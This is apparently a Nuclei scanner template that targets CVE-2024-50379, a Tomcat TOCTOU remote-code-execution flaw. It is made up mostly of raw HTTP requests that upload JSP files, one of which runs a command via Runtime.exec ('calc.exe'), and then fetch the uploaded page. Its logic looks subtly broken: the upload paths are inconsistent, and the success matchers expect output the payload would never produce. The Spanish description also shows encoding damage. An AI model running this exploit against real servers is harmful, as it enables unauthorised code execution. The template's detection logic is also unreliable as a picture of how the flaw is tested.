id: CVE-2024-50379
info:
  name: Apache Tomcat TOCTOU RCE
  author: JF0x0r
  severity: critical
  description: |
    Apache Tomcat es vulnerable a una condici贸n de carrera TOCTOU (Time-of-Check Time-of-Use) durante la compilaci贸n de archivos JSP. 
    Esto permite a los atacantes reemplazar archivos JSP con versiones maliciosas, llevando a la ejecuci贸n remota de c贸digo (RCE).
  references:
    - https://www.cvedetails.com/cve/CVE-2024-50379
    - https://lists.apache.org/thread/y6lj6q1xnp822g6ro70tn19sgtjmr80r
  tags: tomcat,rce,toctou

requests:
  - raw:
      - |
        POST /upload.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
        Content-Length: 294

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="hello.jsp"
        Content-Type: text/plain

        <% out.println("Hello, World!"); %>
        ------WebKitFormBoundary--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body

  - raw:
      - |
        POST /uploads/upload.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
        Content-Length: 547

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="HELLO.JSP"
        Content-Type: text/plain

        <%@ page import="java.io.*" %>
        <%
            Runtime.getRuntime().exec("calc.exe");
        %>
        ------WebKitFormBoundary--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body

  - raw:
      - |
        GET /uploads/hello.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "Calculator has been opened successfully"
        part: body
      - type: word
        words:
          - "Error while opening calculator"
        part: body
